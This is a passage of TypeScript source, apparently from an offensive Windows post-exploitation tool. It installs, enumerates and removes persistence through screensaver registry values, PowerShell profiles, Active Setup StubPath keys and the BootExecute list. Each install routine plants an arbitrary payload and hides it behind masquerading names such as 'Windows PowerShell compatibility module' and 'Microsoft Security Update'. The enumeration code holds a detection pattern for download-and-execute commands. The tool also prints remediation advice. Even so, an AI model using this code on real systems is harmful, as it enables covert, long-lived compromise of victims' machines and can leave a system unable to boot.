Write-Output "[*] Original SCRNSAVE.EXE: $($orig.'SCRNSAVE.EXE')"
Write-Output "[*] Original ScreenSaveActive: $($orig.ScreenSaveActive)"
Write-Output "[*] Original ScreenSaveTimeOut: $($orig.ScreenSaveTimeOut)"
Write-Output ""

# Set screensaver to payload
Set-ItemProperty '${regPath}' -Name 'SCRNSAVE.EXE' -Value '${payload}' -Type String
Set-ItemProperty '${regPath}' -Name 'ScreenSaveActive' -Value '1' -Type String
Set-ItemProperty '${regPath}' -Name 'ScreenSaveTimeOut' -Value '${ssTimeout}' -Type String
Set-ItemProperty '${regPath}' -Name 'ScreenSaverIsSecure' -Value '0' -Type String

$verify = Get-ItemProperty '${regPath}'
Write-Output "[+] SCRNSAVE.EXE: $($verify.'SCRNSAVE.EXE')"
Write-Output "[+] ScreenSaveActive: $($verify.ScreenSaveActive)"
Write-Output "[+] ScreenSaveTimeOut: $($verify.ScreenSaveTimeOut) seconds"
Write-Output ""
Write-Output "[*] Payload will run after ${ssTimeout} seconds of idle time"
Write-Output "[*] Runs as current user (no admin needed)"
Write-Output "[*] Persists across logons (HKCU registry)"
Write-Output ""
Write-Output "Remove: winhook screensaver_persist --action remove"
Write-Output "STATUS=SUCCESS"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-SCRN-011",
        provider: "windows",
        severity: "high",
        status: "PERSISTED",
        resource: "screensaver://hkcu",
        title: `Screensaver persistence installed: ${payload} (${ssTimeout}s idle)`,
        details: "Payload runs as current user when idle timeout is reached. No admin required.",
        remediation: "Remove: winhook screensaver_persist --action remove",
      })
    }
  }

  if (action === "remove") {
    const script = `
Remove-ItemProperty '${regPath}' -Name 'SCRNSAVE.EXE' -Force -ErrorAction SilentlyContinue
Set-ItemProperty '${regPath}' -Name 'ScreenSaveActive' -Value '0' -Type String

Write-Output "[+] Screensaver persistence removed"
Write-Output "[+] ScreenSaveActive set to 0"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function powershellProfile(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const payload = argVal(args, "--payload")
  const scope = argVal(args, "--scope") || "current"
  const findings: Finding[] = []
  const output: string[] = ["[*] PowerShell profile persistence...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== PowerShell Profile Persistence (cmd.exe) ===\n")
    const userProfile = `%USERPROFILE%\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1`
    const allUsersProfile = `%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\profile.ps1`
    const targetProfile = scope === "all" ? allUsersProfile : userProfile
    if (action === "enum") {
      const profiles = [
        { name: "Current User, Current Host", path: userProfile },
        { name: "All Users, All Hosts", path: allUsersProfile },
      ]
      for (const p of profiles) {
        const r = await cmd(`if exist "${p.path}" (echo EXISTS & type "${p.path}") else (echo NONE)`, timeout)
        output.push(`[*] ${p.name}: ${r.stdout.includes("EXISTS") ? "EXISTS" : "NONE"}`)
        if (r.stdout.includes("EXISTS"))
          output.push(`    ${p.path}\n    Content:\n${r.stdout.replace("EXISTS\r\n", "").substring(0, 500)}`)
      }
      const policy = await cmd(
        "reg query HKCU\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /v ExecutionPolicy",
        timeout,
      )
      output.push(`\n[*] Execution Policy: ${policy.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "not set"}`)
    }
    if (action === "install") {
      if (!payload) {
        output.push("[!] --payload required")
        return { output: output.join("\n"), findings }
      }
      const dir = targetProfile.replace(/\\[^\\]+$/, "")
      await cmd(`if not exist "${dir}" mkdir "${dir}"`, timeout)
      const r = await cmd(
        `echo # Windows PowerShell compatibility module >> "${targetProfile}" && echo ${payload.replace(/&/g, "^&").replace(/>/g, "^>").replace(/</g, "^<")} >> "${targetProfile}"`,
        timeout,
      )
      output.push(
        r.exitCode === 0
          ? `[+] Profile persistence installed\n    Profile: ${targetProfile}\n    Payload runs on every PS session start`
          : `[!] Failed: ${r.stderr}`,
      )
      findings.push({
        checkId: "WIN-PERSIST-022",
        provider: "windows",
        severity: "high",
        status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
        resource: "profile://powershell",
        title: "PowerShell profile persistence",
        details: `Scope: ${scope}, Payload: ${payload.substring(0, 100)}`,
        remediation: "Monitor profile files. Use -NoProfile in automated scripts.",
      })
    }
    if (action === "remove") {
      output.push("[*] To remove, edit the profile manually:")
      output.push(`    notepad "${targetProfile}"`)
      output.push("[*] Remove lines after '# Windows PowerShell compatibility module'")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== PowerShell Profile Locations ==="
$ErrorActionPreference = 'SilentlyContinue'

$profiles = @(
    @{ Name = 'Current User, Current Host'; Path = $PROFILE.CurrentUserCurrentHost; Scope = 'user' },
    @{ Name = 'Current User, All Hosts'; Path = $PROFILE.CurrentUserAllHosts; Scope = 'user' },
    @{ Name = 'All Users, Current Host'; Path = $PROFILE.AllUsersCurrentHost; Scope = 'machine' },
    @{ Name = 'All Users, All Hosts'; Path = $PROFILE.AllUsersAllHosts; Scope = 'machine' }
)

foreach ($p in $profiles) {
    $exists = Test-Path $p.Path
    $status = if ($exists) { '[EXISTS]' } else { '[NONE]' }
    $writable = $false
    if ($exists) {
        try {
            $testFile = "$($p.Path).cs-test"
            [System.IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force
            $writable = $true
        } catch {}
    } else {
        $dir = Split-Path $p.Path -Parent
        if (Test-Path $dir) {
            try {
                $testFile = "$dir\\cs-test.tmp"
                [System.IO.File]::Create($testFile).Close()
                Remove-Item $testFile -Force
                $writable = $true
            } catch {}
        }
    }
    $writeStatus = if ($writable) { '[WRITABLE]' } else { '[READ-ONLY]' }
    Write-Output "    $status $writeStatus $($p.Name)"
    Write-Output "         $($p.Path)"
    if ($exists) {
        $content = Get-Content $p.Path -Raw
        $lines = ($content -split [char]10).Count
        Write-Output "         Lines: $lines  Size: $([math]::Round((Get-Item $p.Path).Length/1KB, 1)) KB"
        if ($content -match 'Invoke-Expression|IEX|DownloadString|Net\.WebClient|Start-Process|cmd\.exe|powershell\.exe') {
            Write-Output "         [!!!] SUSPICIOUS content detected — may contain existing backdoor"
        }
    }
    Write-Output ""
}

Write-Output "=== PowerShell Execution Policy ==="
$policies = Get-ExecutionPolicy -List
foreach ($pol in $policies) {
    Write-Output "    $($pol.Scope): $($pol.ExecutionPolicy)"
}

Write-Output ""
Write-Output "=== Profile Loading Behavior ==="
Write-Output "[*] Profiles load automatically on every PowerShell session start"
Write-Output "[*] -NoProfile flag skips loading (used by some automated tools)"
Write-Output "[*] ISE, VS Code, Windows Terminal all load profiles"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PERSIST-021",
      provider: "windows",
      severity: r.stdout.includes("SUSPICIOUS") ? "high" : "info",
      status: "ENUMERATED",
      resource: "profile://powershell",
      title: "PowerShell profile enumeration — persistence locations and write permissions",
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor profile files for changes. Use -NoProfile in automated scripts. Restrict AllUsers profile write access.",
    })
  }

  if (action === "install") {
    if (!payload) {
      output.push("[!] --payload required for install action")
      return { output: output.join("\n"), findings }
    }
    const profilePath = scope === "all" ? "$PROFILE.AllUsersAllHosts" : "$PROFILE.CurrentUserCurrentHost"
    const script = `
Write-Output "=== Installing PowerShell Profile Persistence ==="
$profilePath = ${profilePath}
Write-Output "[*] Target profile: $profilePath"

$dir = Split-Path $profilePath -Parent
if (-not (Test-Path $dir)) {
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Write-Output "[+] Created directory: $dir"
}

$payload = '${payload.replace(/'/g, "''")}'
$marker = "# Windows PowerShell compatibility module"

if (Test-Path $profilePath) {
    $existing = Get-Content $profilePath -Raw
    if ($existing -match [regex]::Escape($payload)) {
        Write-Output "[*] Payload already present in profile"
        exit 0
    }
    Write-Output "[*] Appending to existing profile..."
    Add-Content $profilePath -Value "$([char]10)$marker$([char]10)$payload"
} else {
    Write-Output "[*] Creating new profile..."
    Set-Content $profilePath -Value "$marker$([char]10)$payload"
}

Write-Output "[+] Profile persistence installed"
Write-Output "[+] Payload will execute on every PowerShell session start"
Write-Output "[*] Profile: $profilePath"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PERSIST-036",
      provider: "windows",
      severity: "high",
      status: r.stdout.includes("installed") ? "EXECUTED" : "FAILED",
      resource: "profile://powershell",
      title: "PowerShell profile persistence installed",
      details: `Scope: ${scope}, Payload: ${payload.substring(0, 100)}`,
      remediation: "Monitor $PROFILE paths for modifications. Use file integrity monitoring on profile locations.",
    })
  }

  if (action === "remove") {
    const profilePath = scope === "all" ? "$PROFILE.AllUsersAllHosts" : "$PROFILE.CurrentUserCurrentHost"
    const script = `
$profilePath = ${profilePath}
if (Test-Path $profilePath) {
    $content = Get-Content $profilePath -Raw
    $cleaned = $content -replace '(?s)# Windows PowerShell compatibility module.*?(?=\\n#|\\z)', ''
    if ($cleaned.Trim()) {
        Set-Content $profilePath -Value $cleaned.Trim()
        Write-Output "[+] Payload removed, profile preserved"
    } else {
        Remove-Item $profilePath -Force
        Write-Output "[+] Empty profile deleted: $profilePath"
    }
} else {
    Write-Output "[*] Profile not found: $profilePath"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function activeSetup(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "Microsoft.Update.Security"
  const findings: Finding[] = []
  const output: string[] = ["[*] Active Setup persistence...\n"]

  const regPath = `HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{${name}}`
  const regPathCmdBase = "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components"

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Active Setup Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const r = await cmd(`reg query "${regPathCmdBase}" /s /v "StubPath"`, timeout)
      output.push("[*] Active Setup entries with StubPath:\n" + (r.stdout || "(none)"))
      output.push("\n[*] Active Setup runs ONCE per user at first logon (or version change)")
      output.push("[*] Executed BEFORE Explorer shell — very early execution")
    }
    if (action === "install") {
      if (!payload) {
        output.push("[!] --payload required")
        return { output: output.join("\n"), findings }
      }
      const guid = `{${name.replace(/\./g, "-")}}`
      const guidPath = `${regPathCmdBase}\\${guid}`
      await cmd(`reg add "${guidPath}" /ve /t REG_SZ /d "Microsoft Security Update" /f`, timeout)
      await cmd(`reg add "${guidPath}" /v "StubPath" /t REG_SZ /d "${payload}" /f`, timeout)
      const r = await cmd(`reg add "${guidPath}" /v "Version" /t REG_SZ /d "1,0,0,1" /f`, timeout)
      output.push(
        r.exitCode === 0
          ? `[+] Active Setup installed\n    GUID: ${guid}\n    StubPath: ${payload}\n    Version: 1,0,0,1\n[*] Executes once per user at next logon`
          : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-PERSIST-024",
          provider: "windows",
          severity: "high",
          status: "EXECUTED",
          resource: `registry://active-setup/${guid}`,
          title: `Active Setup persistence: ${guid}`,
          details: `Payload: ${payload}`,
          remediation: `Remove: reg delete "${guidPath}" /f`,
        })
    }
    if (action === "remove") {
      const guid = `{${name.replace(/\./g, "-")}}`
      const r = await cmd(`reg delete "${regPathCmdBase}\\${guid}" /f`, timeout)
      output.push(r.exitCode === 0 ? `[+] Active Setup removed: ${guid}` : `[!] Failed: ${r.stderr}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Active Setup Registry Entries ==="
$ErrorActionPreference = 'SilentlyContinue'

$basePath = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components"
$entries = Get-ChildItem $basePath -ErrorAction SilentlyContinue

Write-Output "[*] Total Active Setup entries: $($entries.Count)"
Write-Output ""

$suspicious = @()
foreach ($entry in $entries) {
    $props = Get-ItemProperty $entry.PSPath -ErrorAction SilentlyContinue
    $stubCmd = $props.StubPath
    if (-not $stubCmd) { continue }

    $isMicrosoft = $stubCmd -match 'system32|syswow64|Microsoft|Windows|Common Files'
    if (-not $isMicrosoft) {
        $suspicious += [PSCustomObject]@{
            GUID = Split-Path $entry.Name -Leaf
            Name = $props.'(default)'
            StubPath = $stubCmd
            Version = $props.Version
        }
    }
}

if ($suspicious.Count -gt 0) {
    Write-Output "[!] Non-Microsoft Active Setup entries ($($suspicious.Count)):"
    foreach ($s in $suspicious) {
        Write-Output "    GUID: $($s.GUID)"
        Write-Output "    Name: $($s.Name)"
        Write-Output "    Stub: $($s.StubPath)"
        Write-Output "    Ver:  $($s.Version)"
        Write-Output ""
    }
} else {
    Write-Output "[*] All entries appear to be Microsoft defaults"
}

Write-Output "=== How Active Setup Works ==="
Write-Output "[*] HKLM entries run ONCE per user at first logon (or version change)"
Write-Output "[*] Executed BEFORE Explorer shell — very early execution"
Write-Output "[*] Per-user tracking: HKCU\\...\\Active Setup\\Installed Components\\{GUID}"
Write-Output "[*] Changing Version forces re-execution for all users"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PERSIST-023",
      provider: "windows",
      severity: r.stdout.includes("[!]") ? "high" : "info",
      status: "ENUMERATED",
      resource: "registry://active-setup",
      title: "Active Setup registry persistence enumeration",
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor Active Setup registry key changes. Audit non-Microsoft entries. Use SIEM rules for new GUID creation.",
    })
  }

  if (action === "install") {
    if (!payload) {
      output.push("[!] --payload required for install action")
      return { output: output.join("\n"), findings }
    }
    const guid = `{${name.replace(/\./g, "-")}}`
    const script = `
Write-Output "=== Installing Active Setup Persistence ==="
$guid = '${guid}'
$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\$guid"

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

Set-ItemProperty $regPath -Name '(default)' -Value 'Microsoft Security Update' -Type String
Set-ItemProperty $regPath -Name 'StubPath' -Value '${payload.replace(/'/g, "''")}' -Type String
Set-ItemProperty $regPath -Name 'Version' -Value '1,0,0,1' -Type String

Write-Output "[+] Active Setup persistence installed"
Write-Output "    GUID: $guid"
Write-Output "    StubPath: ${payload}"
Write-Output "    Version: 1,0,0,1"
Write-Output ""
Write-Output "[*] Will execute once for each user at their next logon"
Write-Output "[*] To force re-execution: increment Version value"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PERSIST-037",
      provider: "windows",
      severity: "high",
      status: r.stdout.includes("installed") ? "EXECUTED" : "FAILED",
      resource: `registry://active-setup/${guid}`,
      title: "Active Setup per-user persistence installed",
      details: `GUID: ${guid}, Payload: ${payload}`,
      remediation: "Remove the registry key. Monitor Event ID 4657 for Active Setup modifications.",
    })
  }

  if (action === "remove") {
    const guid = `{${name.replace(/\./g, "-")}}`
    const script = `
$guid = '${guid}'
$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\$guid"
if (Test-Path $regPath) {
    Remove-Item $regPath -Recurse -Force
    Write-Output "[+] Active Setup entry removed: $guid"
} else {
    Write-Output "[*] Entry not found: $guid"
}

$users = Get-ChildItem "REGISTRY::HKEY_USERS" -ErrorAction SilentlyContinue
foreach ($u in $users) {
    $userPath = "REGISTRY::$($u.Name)\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\$guid"
    if (Test-Path $userPath) {
        Remove-Item $userPath -Recurse -Force
        Write-Output "[+] Removed user tracking: $($u.Name)"
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function bootExec(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] BootExecute persistence...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== BootExecute Persistence (cmd.exe) ===\n")
    const smKey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
    if (action === "enum") {
      const r = await cmd(`reg query "${smKey}" /v "BootExecute"`, timeout)
      output.push("[*] BootExecute:\n" + (r.stdout || "(query failed)"))
      const setup = await cmd(`reg query "${smKey}" /v "SetupExecute"`, timeout)
      if (setup.exitCode === 0) output.push("\n[*] SetupExecute:\n" + setup.stdout)
      output.push("\n[*] BootExecute programs run BEFORE any service or logon")
      output.push("[*] Default: 'autocheck autochk *'")
      output.push("[*] Must be native executables in %SystemRoot%\\System32")
      const isCustom = r.stdout && !r.stdout.match(/autocheck\s+autochk\s+\*/i)
      findings.push({
        checkId: "WIN-PERSIST-025",
        provider: "windows",
        severity: isCustom ? "critical" : "info",
        status: "ENUMERATED",
        resource: "registry://boot-execute",
        title: "BootExecute early boot check",
        details: r.stdout?.substring(0, 300) || "Query failed",
        remediation: "Only 'autocheck autochk *' should be present.",
      })
    }
    if (action === "install") {
      if (!payload) {
        output.push("[!] --payload required — must be native exe in System32")
        return { output: output.join("\n"), findings }
      }
      const current = await cmd(`reg query "${smKey}" /v "BootExecute"`, timeout)
      const curVal =
        current.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || "autocheck autochk *"
      const r = await cmd(`reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "${curVal}\\0${payload}" /f`, timeout)
      output.push(
        r.exitCode === 0
          ? `[+] BootExecute entry added: ${payload}\n[!!!] WARNING: Invalid binary may prevent boot\n[*] Effective on next reboot`
          : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-PERSIST-026",
          provider: "windows",
          severity: "critical",
          status: "EXECUTED",
          resource: "registry://boot-execute",
          title: "BootExecute persistence installed",
          details: `Payload: ${payload}`,
          remediation: `Remove from BootExecute. Restore: reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *" /f`,
        })
    }
    if (action === "remove") {
      const r = await cmd(`reg add "${smKey}" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *" /f`, timeout)
      output.push(r.exitCode === 0 ? "[+] BootExecute restored to default" : `[!] Failed: ${r.stderr}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== BootExecute Registry Analysis ==="
$ErrorActionPreference = 'SilentlyContinue'

$smPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
$bootExec = (Get-ItemProperty $smPath).BootExecute

Write-Output "[*] Current BootExecute value(s):"
if ($bootExec) {
    foreach ($entry in $bootExec) {
        $isDefault = $entry -eq 'autocheck autochk *'
        $marker = if ($isDefault) { '[DEFAULT]' } else { '[!!!CUSTOM]' }
        Write-Output "    $marker $entry"
    }
} else {
    Write-Output "    [EMPTY] No BootExecute entries"
}

Write-Output ""
Write-Output "=== Session Manager Security Check ==="

$setupExec = (Get-ItemProperty $smPath).SetupExecute
if ($setupExec) {
    Write-Output "[!] SetupExecute (runs once at boot):"
    foreach ($entry in $setupExec) {
        Write-Output "    $entry"
    }
}

$pendingRename = (Get-ItemProperty $smPath).PendingFileRenameOperations
if ($pendingRename) {
    Write-Output "[*] PendingFileRenameOperations ($($pendingRename.Count) entries)"
}

$knownDlls = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs" -ErrorAction SilentlyContinue
if ($knownDlls) {
    Write-Output ""
    Write-Output "[*] KnownDLLs entries: $(($knownDlls.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' }).Count)"
}

Write-Output ""
Write-Output "=== BootExecute Explained ==="
Write-Output "[*] Programs listed run BEFORE any service or logon — native API only"
Write-Output "[*] Default: 'autocheck autochk *' (runs chkdsk if needed)"
Write-Output "[*] Custom entries must be native executables (no Win32 subsystem yet)"
Write-Output "[*] Binary must be in %SystemRoot%\\System32"
Write-Output "[*] Runs as SYSTEM with kernel-level access"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PERSIST-038",
      provider: "windows",
      severity: r.stdout.includes("CUSTOM") ? "critical" : "info",
      status: "ENUMERATED",
      resource: "registry://boot-execute",
      title: "BootExecute and Session Manager early boot persistence check",
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor BootExecute registry changes. Only 'autocheck autochk *' should be present. Alert on any additions.",
    })
  }

  if (action === "install") {
    if (!payload) {
      output.push("[!] --payload required — must be a native executable name in System32")
      return { output: output.join("\n"), findings }
    }
    const script = `
Write-Output "=== Installing BootExecute Persistence ==="
$smPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
$current = (Get-ItemProperty $smPath).BootExecute

if (-not $current) { $current = @() }
if ($current -is [string]) { $current = @($current) }

$newEntry = '${payload.replace(/'/g, "''")}'
if ($current -contains $newEntry) {
    Write-Output "[*] Entry already exists in BootExecute"
    exit 0
}

$updated = $current + $newEntry
Set-ItemProperty $smPath -Name 'BootExecute' -Value $updated -Type MultiString

Write-Output "[+] BootExecute entry added: $newEntry"
Write-Output "[*] Current entries:"
foreach ($e in $updated) {
    Write-Output "    $e"
}
Write-Output ""
Write-Output "[!!!] WARNING: If binary is invalid, system may fail to boot"
Write-Output "[*] Entry runs before Win32 — must be native API executable"
Write-Output "[*] Effective on next reboot"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-PERSIST-039",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("added") ? "EXECUTED" : "FAILED",
      resource: "registry://boot-execute",
      title: "BootExecute early boot persistence installed",
      details: `Payload: ${payload}`,
      remediation: "Remove the entry from BootExecute MultiString. Monitor Session Manager registry changes.",
    })
  }

  if (action === "remove") {
    const script = `
$smPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
$current = (Get-ItemProperty $smPath).BootExecute

if (-not $current) {
    Write-Output "[*] BootExecute is empty"
    exit 0
}
if ($current -is [string]) { $current = @($current) }

$default = @('autocheck autochk *')
$removed = $current | Where-Object { $_ -notin $default }

if ($removed.Count -gt 0) {
    Write-Output "[+] Removing non-default entries:"
    foreach ($r in $removed) {
        Write-Output "    $r"
    }
    Set-ItemProperty $smPath -Name 'BootExecute' -Value $default -Type MultiString
    Write-Output "[+] BootExecute restored to default"
} else {
    Write-Output "[*] Only default entries present — nothing to remove"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}
